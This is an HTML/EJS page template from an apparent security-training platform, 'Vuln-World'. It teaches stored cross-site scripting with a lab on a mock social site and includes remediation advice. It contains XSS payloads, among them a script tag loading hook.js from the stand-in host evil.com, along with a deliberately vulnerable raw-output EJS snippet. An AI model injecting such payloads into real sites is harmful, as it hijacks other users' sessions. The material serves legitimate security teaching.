<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title><%= vuln.name %> - Vuln-World</title>
  <style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f9fafb; color: #374151; line-height: 1.6; }
    header { background: #1f2937; color: #fff; padding: 15px 30px; display: flex; align-items: center; justify-content: space-between; }
    header a { color: #9ca3af; text-decoration: none; font-weight: bold; }
    header a:hover { color: white; }
    .container { max-width: 900px; margin: 40px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
    h1 { margin-top: 0; color: #111827; }
    h2 { color: #1f2937; border-bottom: 2px solid #e5e7eb; padding-bottom: 10px; margin-top: 40px; text-transform: uppercase; font-size: 18px; letter-spacing: 0.05em; }
    .badge { display: inline-block; padding: 4px 8px; background: #e5e7eb; border-radius: 12px; font-size: 12px; font-weight: bold; margin-right: 10px; color: #4b5563; }
    .btn { display: inline-block; padding: 12px 24px; background: #2563eb; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; margin: 20px 0; }
    .btn:hover { background: #1d4ed8; }
    pre { background: #1f2937; color: #f8f8f2; padding: 20px; border-radius: 6px; overflow-x: auto; font-family: monospace; font-size: 14px; }
    .vuln-code { border-left: 4px solid #ef4444; }
    .sec-code { border-left: 4px solid #10b981; }
    .diagram { background: #f3f4f6; padding: 20px; font-family: monospace; white-space: pre; border-radius: 6px; border: 1px solid #e5e7eb; overflow-x: auto; font-size: 14px; line-height: 1.5; }
    ul { padding-left: 20px; }
    li { margin-bottom: 8px; }
  </style>
</head>
<body>
  <header>
    <a href="/vulnerabilities">← Back to Vulnerabilities</a>
  </header>
  <div class="container">
    <h1><%= vuln.name %></h1>
    <div style="margin-bottom: 30px;">
      <span class="badge"><%= vuln.category %></span>
      <span class="badge"><%= vuln.difficulty %></span>
    </div>
    
    <a href="/labs/<%= vuln.lab %>?challenge=<%= vuln.id %>" class="btn">Start Lab (<%= vuln.lab %>)</a>
    
    <h2>What Is It?</h2>
    <p>Stored Cross-Site Scripting (XSS) occurs when a web application gathers malicious input from a user, stores it in a database, and then displays it to other users later without properly encoding it.</p>

    <h2>In Simple Words</h2>
    <p>Instead of bouncing a script off the server immediately (Reflected XSS), the script is painted on a public wall (Stored XSS). Anyone who looks at the wall later will get infected.</p>

    <h2>Where Does It Appear?</h2>
    <ul>
        <li>Social media feeds</li>
        <li>Comment sections on blogs</li>
        <li>User profiles (bio, name fields)</li>
        <li>Product reviews</li>
        <li>Support ticket systems</li>
    </ul>

    <h2>How Does It Occur?</h2>
    <div class="diagram">
VULNERABLE:
Attacker Browser
  ↓
POST /posts (content=&lt;script&gt;steal()&lt;/script&gt;)
  ↓
Server stores payload in Database
  ↓
...later...
  ↓
Victim Browser requests /feed
  ↓
Server retrieves payload from Database
  ↓
Server returns HTML with &lt;script&gt;steal()&lt;/script&gt;
  ↓
Victim Browser executes the script
    </div>

    <h2>HTTP Example</h2>
    <pre>
POST /posts HTTP/1.1
Host: example.com

content=Check out my profile! &lt;script src="http://evil.com/hook.js"&gt;&lt;/script&gt;</pre>
    <p>The application saves this content. When the victim navigates to the page displaying posts, the server serves the script, which contacts <code>evil.com</code>.</p>

    <h2>Burp Suite Investigation</h2>
    <ol>
        <li>Identify forms that save data which is later displayed (e.g., creating a post).</li>
        <li>Submit unique alphanumeric strings (e.g., "STORED_XSS_TEST").</li>
        <li>Navigate to the page where the data is displayed.</li>
        <li>Inspect the response in Burp to see if "STORED_XSS_TEST" is present.</li>
        <li>If present, attempt injecting HTML like <code>&lt;img src=x onerror=alert(1)&gt;</code>.</li>
        <li>Refresh the display page to see if the script executes.</li>
    </ol>

    <h2>How Developers Accidentally Create It</h2>
    <p>Vulnerable Code (EJS using raw HTML output):</p>
    <pre class="vuln-code">
&lt;!-- Using &lt;%- tells EJS NOT to encode the output --&gt;
&lt;div class="post-content"&gt;&lt;%- post.content %&gt;&lt;/div&gt;
    </pre>
    <p>Secure Code (EJS using standard encoded output):</p>
    <pre class="sec-code">
&lt;!-- Using &lt;%= tells EJS to safely encode the output --&gt;
&lt;div class="post-content"&gt;&lt;%= post.content %&gt;&lt;/div&gt;
    </pre>

    <h2>Impact</h2>
    <ul>
        <li>Widespread compromise (a "XSS worm" can infect thousands of users in minutes on a social network).</li>
        <li>Persistent session hijacking.</li>
        <li>Defacement of popular pages.</li>
    </ul>

    <h2>How to Find It in Real Applications</h2>
    <ul>
        <li>Test all input fields in profile settings, especially those viewed by other users.</li>
        <li>Test file upload filenames and metadata (like EXIF data) that might be displayed.</li>
    </ul>

    <h2>Remediation</h2>
    <p>Use Context-Aware Output Encoding when rendering user-supplied data from the database. If the application intentionally allows users to submit HTML (e.g., a rich text editor), use a robust HTML sanitization library (like DOMPurify) to strip dangerous tags (<code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, <code>onerror=</code>) while allowing safe tags (<code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>).</p>

    <h2>Secure Design Checklist</h2>
    <ul>
        <li>Encode all user-generated content on output.</li>
        <li>Sanitize input if rich HTML is required.</li>
        <li>Use strict Content Security Policy (CSP).</li>
    </ul>

    <h2>Lab Investigation Guide</h2>
    <p>You are logged in as Alice on SocialSphere. Look at the post creation functionality. Can you submit a post that forces anyone viewing the feed to execute your custom HTML or JavaScript?</p>

    <h2>Post-Lab Explanation</h2>
    <p>In the lab, you submitted a payload into the SocialSphere post content field. The server saved this payload to the SQLite database without sanitizing it. When the feed was rendered, the EJS template used the <code>&lt;%- %&gt;</code> tag, instructing it to render raw HTML. This allowed your <code>&lt;script&gt;</code> tag to be executed by the browser.</p>
  </div>
</body>
</html>
